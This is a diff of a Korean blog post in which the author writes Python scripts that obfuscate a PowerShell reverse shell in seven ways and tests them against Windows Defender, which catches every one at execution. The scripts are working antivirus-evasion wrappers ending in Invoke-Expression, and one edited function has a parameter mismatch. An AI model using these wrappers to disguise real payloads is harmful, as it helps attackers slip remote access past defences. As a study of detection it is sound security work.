@@ -8,7 +8,7 @@ published: True
 
 # #Intro
 
-공부를 하며 Linux 계열의 셸만을 주로 다루다보니 정작 윈도우의 셸인 PowerShell에 대해서는 잘 알지 못했고, PowerShell로 명령을 수행하는 것이 익숙하지 않아 매번 CLI 작업이 필요할 때에는 WSL2의 윈도우 마운트 드라이브로 넘어와 작업을 하곤 했다. 이번 기회를 통해 PowerShell을 맛보고, PowerShell의 난독화 기법에 대해 알아보았다.
+공부를 하며 Linux 계열의 셸만을 주로 다루다보니 정작 윈도우의 셸인 PowerShell에 대해서는 잘 알지 못했고, PowerShell로 명령을 수행하는 것이 익숙하지 않아 매번 CLI 작업이 필요할 때에는 WSL2의 윈도우 마운트 드라이브로 넘어와 작업을 하곤 했다. 이번 기회를 통해 PowerShell을 맛보고, PowerShell의 난독화 기법에 대해 공부하며 Python 언어로 난독화 스크립트를 작성해보았다.
 
 <br>
 
@@ -86,8 +86,8 @@ $StreamWriter.Close()
 
 ```python
 # base64_.py
-import base64
 
+import base64
 
 def base64_obfuscation(revshell_code):
     revshell_code = revshell_code.replace('\n', '')
@@ -95,25 +95,27 @@ def base64_obfuscation(revshell_code):
     revshell_code = revshell_code.replace("'", '"')
 
     b64 = base64.b64encode(revshell_code.encode('utf-8')).decode('utf-8')
-    new_revshell = f'[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{b64}")) | Invoke-Expression'
+    obfuscated_code = f'[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{b64}")) | Invoke-Expression'
 
-    return new_revshell
+    return obfuscated_code
 
 if __name__ == "__main__":
     with open('revshell.txt', 'r') as file:
         revshell_code = file.read()
 
-        new_revshell = base64_obfuscation(revshell_code)
+        obfuscated_code = base64_obfuscation(revshell_code)
 
-        print(new_revshell)
+        print(obfuscated_code)
 
         with open('revshell.ps1', 'w') as file:
-            file.write(new_revshell)
+            file.write(obfuscated_code)
 ```
 
 <br>
 
-코드를 실행하여 .ps1 파일이 생성됨과 동시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.
+![image](/assets/posts/250902-13.png)
+
+스크립트를 실행하면 터미널 창에서 정상적으로 난독화된 코드를 확인할 수 있으나, `.ps1` 파일이 생성됨과 동시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.
 
 <br>
 
@@ -134,26 +136,30 @@ def random_case_obfuscation(revshell_code):
     revshell_code = revshell_code.replace(' ', '')
     revshell_code = revshell_code.lower()
 
-    new_revshell = ""
+    obfuscated_code = ""
     for index, char in enumerate(revshell_code):
         if index % 2 == 0:
-            new_revshell += char.upper()
+            obfuscated_code += char.upper()
         else:
-            new_revshell += char
+            obfuscated_code += char
 
-    return new_revshell
+    return obfuscated_code
 
 if __name__ == "__main__":
     with open('revshell.txt', 'r') as file:
         revshell_code = file.read()
 
-        new_revshell = random_case_obfuscation(revshell_code)
+        obfuscated_code = random_case_obfuscation(revshell_code)
 
-        print(new_revshell)
+        print(obfuscated_code)
 
         with open('revshell.ps1', 'w') as file:
-            file.write(new_revshell)
+            file.write(obfuscated_code)
 ```
+
+<br>
+
+![image](/assets/posts/250902-14.png)
 
 위의 코드로 대소문자가 섞인 난독화된 PowerShell Reverse Shell 코드를 생성할 수 있다. 그러나 이 방법도 파일이 생성됨과 동시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.
 
@@ -175,47 +181,47 @@ def division_obfuscation(revshell_code):
     revshell_code = revshell_code.replace(' ', '')
     revshell_code = revshell_code.replace("'", '"')
 
-    new_revshell = '$str='
+    obfuscated_code = '$str='
     for index, char in enumerate(revshell_code):
 
         if index % 3 == 0:
-            new_revshell += f"'{char}"
+            obfuscated_code += f"'{char}"
         elif index % 3 == 1:
-            new_revshell += f"{char}'"
+            obfuscated_code += f"{char}'"
         else:
-            new_revshell += f"+'{char}'+"
+            obfuscated_code += f"+'{char}'+"
 
-    if new_revshell.endswith("+"):
-        new_revshell = new_revshell[:-1]
+    if obfuscated_code.endswith("+"):
+        obfuscated_code = obfuscated_code[:-1]
 
-    new_revshell += ';Invoke-Expression $str'
+    obfuscated_code += ';Invoke-Expression $str'
 
-    return new_revshell
+    return obfuscated_code
 
 
 if __name__ == "__main__":
     with open('revshell.txt', 'r') as file:
         revshell_code = file.read()
 
-        new_revshell = division_obfuscation(revshell_code)
+        obfuscated_code = division_obfuscation(revshell_code)
 
-        print(new_revshell)
+        print(obfuscated_code)
 
         with open('revshell.ps1', 'w') as file:
-            file.write(new_revshell)
+            file.write(obfuscated_code)
 ```
 
 <br>
 
 ![image](/assets/posts/250902-5.png)
 
-해당 코드를 실행하면, 이번에는 Windows Defender에 의해 차단되지 않고 정상적으로 .ps1 파일이 생성되는 것을 확인할 수 있다.
+해당 코드를 실행하면, 이번에는 Windows Defender에 의해 차단되지 않고 정상적으로 `.ps1` 파일이 생성되는 것을 확인할 수 있다.
 
 <br>
 
 ![image](/assets/posts/250902-6.png)
 
-그러나, 생성된 .ps1 파일을 실행하면, 위와 같이 Windows Defender가 차단하는 것을 확인할 수 있다. 이는 이전 난독화 기법에서 파일 내의 코드 혹은 시그니처를 기반으로 악성코드를 탐지하는 것과 다르게, 파일 실행 시 동작하는 행위를 기반으로 악성코드를 탐지하는 것을 알 수 있다.
+그러나, 생성된 `.ps1` 파일을 실행하면, 위와 같이 Windows Defender가 차단하는 것을 확인할 수 있다. 이는 이전 난독화 기법에서 파일 내의 코드 혹은 시그니처를 기반으로 악성코드를 탐지하는 것과 다르게, 파일 실행 시 동작하는 행위를 기반으로 악성코드를 탐지하는 것을 알 수 있다.
 
 <br>
 <br>
@@ -231,39 +237,50 @@ if __name__ == "__main__":
 
 import random
 
-revshell_code = ''
-with open('revshell.txt', 'r') as file:
-    revshell_code = file.read()
+def reorder_obfuscation():
+    revshell_code = revshell_code.replace('\n', '')
+    revshell_code = revshell_code.replace('\r', '')
+    revshell_code = revshell_code.replace(' ', '')
+    revshell_code = revshell_code.replace("'", '"')
 
-revshell_code = revshell_code.replace('\n', '')
-revshell_code = revshell_code.replace('\r', '')
-revshell_code = revshell_code.replace(' ', '')
-revshell_code = revshell_code.replace("'", '"')
+    indexed_chars = list(enumerate(revshell_code))
+    random.shuffle(indexed_chars)
+    new_chars = [(new_index, (old_index, char)) for new_index, (old_index, char) in enumerate(indexed_chars)]
+    new_chars_sorted = sorted(new_chars, key=lambda x: x[1][0])
 
-indexed_chars = list(enumerate(revshell_code))
-random.shuffle(indexed_chars)
-new_chars = [(new_index, (old_index, char)) for new_index, (old_index, char) in enumerate(indexed_chars)]
-new_chars_sorted = sorted(new_chars, key=lambda x: x[1][0])
+    shuffled_string = ''.join([f"'{char}'," for index, char in indexed_chars])
+    shuffled_string = shuffled_string[:-1]
 
-shuffled_string = ''.join([f"'{char}'," for index, char in indexed_chars])
-shuffled_string = shuffled_string[:-1]
+    shuffled_index = ''.join([f'{{{new_index}}}' for new_index, (old_index, char) in new_chars_sorted])
+    shuffled_index = "'" + shuffled_index + "'"
 
-shuffled_index = ''.join([f'{{{new_index}}}' for new_index, (old_index, char) in new_chars_sorted])
-shuffled_index = "'" + shuffled_index + "'"
+    obfuscated_code = f'$str={shuffled_index}-f{shuffled_string};Invoke-Expression $str'
 
-new_revshell = f'$str={shuffled_index}-f{shuffled_string};Invoke-Expression $str'
+    return obfuscated_code
 
-print(new_revshell)
+if __name__ == "__main__":
+    with open('revshell.txt', 'r') as file:
+        revshell_code = file.read()
 
-with open('revshell.ps1', 'w') as file:
-    file.write(new_revshell)
+        obfuscated_code = reorder_obfuscation(revshell_code)
+
+        print(obfuscated_code)
+
+        with open('revshell.ps1', 'w') as file:
+            file.write(obfuscated_code)
 ```
+
+<br>
+
+![image](/assets/posts/250902-12.png)
+
+스크립트를 실행하면 위와 같이 난독화된 코드를 확인할 수 있다.
 
 <br>
 
 ![image](/assets/posts/250902-7.png)
 
-`Write-Output` 명령어를 통해 난독화된 코드가 정상적으로 복원되는 것을 확인할 수 있고, .ps1 파일 생성 시에도 Windows Defender에 의해 차단되지 않는 것을 확인할 수 있다. 그러나, 마찬가지로 해당 파일을 실행하면 Windows Defender에 의해 차단되는 것을 확인할 수 있다.
+난독화된 코드는 `Write-Output` 명령어를 통해 난독화된 코드가 정상적으로 복원되는 것을 확인할 수 있고, `.ps1` 파일 생성 시에도 Windows Defender에 의해 차단되지 않는 것을 확인할 수 있다. 그러나, 마찬가지로 해당 파일을 실행하면 Windows Defender에 의해 차단되는 것을 확인할 수 있다.
 
 <br>
 <br>
@@ -281,33 +298,25 @@ PowerShell에서 백틱(``` ` ```)은 이스케이프 문자로 사용되며, �
 import base64
 import string
 
-import base64_
-
 
 def back_ticks_obfuscation(revshell_code):
     revshell_code = revshell_code.replace('\n', '')
     revshell_code = revshell_code.replace('\r', '')
     revshell_code = revshell_code.replace("'", '"')
 
-    new_revshell = ''
-    flag = False
+    obfuscated_code = ''
     for char in revshell_code:
-        if char not in ['"', 'n', 't', 'r', ' '] and char in string.ascii_letters:
-            new_revshell += '`' + char
-            flag = True
+        if char.lower() not in ['a', 'b', 'e', 'f', 'n', 'r', 't', 'v', 'u', ' ', '"', "'", '0'] and char in string.ascii_letters + string.digits:
+            obfuscated_code += '`' + char
         else:
-            if flag:
-                new_revshell += '`' + char
-                flag = False
-            else:
-                new_revshell += char
+            obfuscated_code += char
 
-    if new_revshell[0] == '`':
-        new_revshell = new_revshell[1:]
+    if obfuscated_code[0] == '`':
+        obfuscated_code = obfuscated_code[1:]
 
-    new_revshell = f"$str='{new_revshell}';Invoke-Expression $str"
+    obfuscated_code = f"$str='{obfuscated_code}';Invoke-Expression $str;"
 
-    return new_revshell
+    return obfuscated_code
 
 
 if __name__ == "__main__":
@@ -316,17 +325,23 @@ if __name__ == "__main__":
 
         base64_revshell = base64.b64encode(revshell_code.encode()).decode()
 
-        new_revshell = back_ticks_obfuscation(base64_revshell)
+        obfuscated_code = back_ticks_obfuscation(revshell_code)
 
-        print(new_revshell)
+        print(obfuscated_code)
 
         with open('revshell.ps1', 'w') as file:
-            file.write(new_revshell)
+            file.write(obfuscated_code)
 ```
 
 <br>
 
-생성된 .ps1 파일은 backtick이 추가되었음에도 불구하고 여전히 Windows Defender에 의해 차단되는 것을 확인할 수 있다.
+PowerShell에서 지원하는 백틱 이스케이프 시퀀스는 `a`, `b`, `e`, `f`, `n`, `r`, `t`, `v`, `u`, ` `, `"`, `'`, `0` 이기에 해당 문자들을 제외하고 백틱을 추가하도록 하였다.
+
+<br>
+
+![image](/assets/posts/250902-15.png)
+
+스크립트를 실행하면 위와 같이 backtick이 추가된 난독화 코드를 확인할 수 있다. 생성된 `.ps1` 파일은 backtick이 추가되었음에도 불구하고 파일이 생성되자 마자 Windows Defender에 의해 차단되는 것을 확인할 수 있다.
 
 <br>
 <br>
@@ -338,40 +353,135 @@ PowerShell에서는 `[char]ascii_code` 형식으로 ASCII 문자를 표현할 �
 <br>
 
 ```python
-def ascii_char_assigns_obfuscation(revshell_code):
+# ascii_char_assigns.py
 
+def ascii_char_assigns_obfuscation(revshell_code):
     revshell_code = revshell_code.replace('\n', '')
     revshell_code = revshell_code.replace('\r', '')
     revshell_code = revshell_code.replace("'", '"')
 
-    new_revshell = ''
+    obfuscated_code = ''
     for char in revshell_code:
-        new_revshell += f"[char]{ord(char)}+"
+        obfuscated_code += f"[char]{ord(char)}+"
 
-    if new_revshell.endswith('+'):
-        new_revshell = new_revshell[:-1]
+    if obfuscated_code.endswith('+'):
+        obfuscated_code = obfuscated_code[:-1]
 
-    new_revshell = f"$str={new_revshell};Invoke-Expression $str"
+    obfuscated_code = f"$str={obfuscated_code};Invoke-Expression $str"
 
-    return new_revshell
+    return obfuscated_code
 
 if __name__ == "__main__":
     with open('revshell.txt', 'r') as file:
         revshell_code = file.read()
 
-        new_revshell = ascii_char_assigns_obfuscation(revshell_code)
+        obfuscated_code = ascii_char_assigns_obfuscation(revshell_code)
 
-        print(new_revshell)
+        print(obfuscated_code)
 
         with open('revshell.ps1', 'w') as file:
-            file.write(new_revshell)
+            file.write(obfuscated_code)
 ```
 
 <br>
 
-스크립트를 실행하면 .ps1 파일은 정상적으로 생성되는 것을 확인할 수 있으나, 실행 시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.
+![image](/assets/posts/250902-11.png)
+
+스크립트를 실행하면 위와 같이 난독화된 코드를 확인할 수 있다. 그러나, `.ps1` 파일은 정상적으로 생성되지만 실행 시에 Windows Defender에 의해 차단된다.
 
 <br>
+<br>
+
+## Replace
+
+PowerShell에서 제공하는 `.replace()` 메서드를 사용하여 특정 문자열을 다른 문자열로 대체하는 방식을 이용한 난독화 기법이다.
+
+<br>
+
+```python
+# replace.py
+
+import random
+import string
+
+
+def replace_obfuscation(revshell_code):
+
+    revshell_code = revshell_code.replace('\n', '')
+    revshell_code = revshell_code.replace('\r', '')
+    revshell_code = revshell_code.replace("'", '"')
+
+    printable = set(string.ascii_letters + string.digits + string.punctuation) - {'"', "'", '\\', '`'}
+    used_chars = set(revshell_code)
+    unused_chars_list = list(printable - used_chars)
+    random.shuffle(unused_chars_list)
+    replacement_map = {}
+
+    for char in used_chars:
+        if unused_chars_list:
+            new_char = unused_chars_list.pop(0)
+            replacement_map[char] = new_char
+
+    obfuscated_code = revshell_code
+    for original_char, new_char in replacement_map.items():
+        obfuscated_code = obfuscated_code.replace(original_char, new_char)
+
+    restore_map = {new_char: original_char for original_char, new_char in replacement_map.items()}
+
+    restore_commands = []
+    for obfuscated_char, original_char in restore_map.items():
+        restore_commands.append(f"$str=$str.Replace('{obfuscated_char}','{original_char}')")
+
+    final_obfuscated_code = f"$str='{obfuscated_code}';"
+    for cmd in restore_commands:
+        final_obfuscated_code += cmd + ";"
+    final_obfuscated_code += "Invoke-Expression $str"
+
+    return final_obfuscated_code
+
+if __name__ == "__main__":
+    with open('revshell.txt', 'r') as file:
+        revshell_code = file.read()
+
+        final_obfuscated_code = replace_obfuscation(revshell_code)
+
+        print(final_obfuscated_code)
+
+        with open('revshell.ps1', 'w') as file:
+            file.write(final_obfuscated_code)
+```
+
+<br>
+
+![image](/assets/posts/250902-10.png)
+
+스크립트를 실행하면, 위와 같이 난독화된 코드를 확인할 수 있다. `.ps1` 파일은 정상적으로 생성되나, 실행 시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.
+
+<br>
+
+<br>
+
+# #Conclusion
+
+| 난독화 기법 | 탐지 여부 (파일 생성 시) | 탐지 여부 (파일 실행 시) |
+|-------------|-------------------------|-------------------------|
+| Base64 Encoding | O | O |
+| Random Case | O | O |
+| Division/Whitespace | X | O |
+| Reorder | X | O |
+| Back Ticks | O | O |
+| Ascii char assigns | X | O |
+| Replace | X | O |
+| |
+| **O**: 탐지됨, **X**: 탐지되지 않음 |
+| Windows Defender 보안 인텔리전스 버전: 1.435.549.0 |
+
+<br>
+
+PowerShell 난독화 기법을 통해 생성된 `.ps1` 파일이 Windows Defender에 의해 탐지되는지 여부를 확인해본 결과, 파일 생성 시점에서는 일부 기법에서 탐지되지 않는 것을 확인할 수 있었으나, 파일 실행 시점에서 모두 탐지되는 것을 확인할 수 있었다. 이는 Windows Defender가 단순히 코드의 형태나 시그니처뿐만 아니라, 코드의 행위와 실행 패턴을 분석하여 악성코드를 탐지하는 능력을 갖추고 있음을 알 수 있었다.
+
+<br>
+
 <br>
 
 > **Reference**
